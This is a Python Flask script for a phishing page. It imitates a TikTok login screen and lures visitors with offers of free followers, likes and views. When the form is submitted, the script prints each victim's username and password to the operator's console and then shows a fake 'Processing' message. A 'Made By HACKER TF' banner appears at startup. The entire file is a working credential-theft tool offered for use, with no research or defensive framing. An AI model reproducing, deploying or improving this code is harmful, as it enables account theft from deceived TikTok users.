from flask import Flask, request
import os
import time

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        followers = request.form.get('followers')
        likes = request.form.get('likes')
        views = request.form.get('views')

        print("\n=== TikTok Login ===")
        print(f"Username: {username}")
        print(f"Password: {password}")
        print(f"Followers: {followers}")
        print(f"Likes: {likes}")
        print(f"Views: {views}")
        print("====================\n")

        return '''
            <h2>Processing...</h2>
            <p>Please wait while we process your request.</p>
        '''

    return '''
    <html>
    <head>
        <title>TikTok Login</title>
        <style>
            body {
                background-color: #111;
                color: white;
                font-family: sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            .login-box {
                background: #1e1e1e;
                padding: 30px;
                border-radius: 10px;
                box-shadow: 0 0 15px #fe2c55;
                width: 300px;
            }
            input, select, button {
                width: 100%;
                padding: 10px;
                margin: 8px 0;
                border-radius: 5px;
                border: none;
            }
            button {
                background-color: #fe2c55;
                color: white;
                font-weight: bold;
                cursor: pointer;
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>Login TikTok</h2>
            <form method="POST">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <select name="followers" required>
                    <option value="">Followers</option>
                    <option value="100">100</option>
                    <option value="500">500</option>
                    <option value="1000">1000</option>
                </select>
                <select name="likes" required>
                    <option value="">Likes</option>
                    <option value="100">100</option>
                    <option value="500">500</option>
                    <option value="1000">1000</option>
                </select>
                <select name="views" required>
                    <option value="">Views</option>
                    <option value="100">100</option>
                    <option value="500">500</option>
                    <option value="1000">1000</option>
                </select>
                <button type="submit">Login</button>
            </form>
        </div>
    </body>
    </html>
    '''

if __name__ == '__main__':
    os.system('clear')  # Clears terminal
    print("\033[1;32m")  # Green bold text
    print("="*40)
    print("      Made By HACKER TF      ")
    print("="*40)
    print("\033[0m")  # Reset style
    time.sleep(1)
    app.run(host='0.0.0.0', port=5000)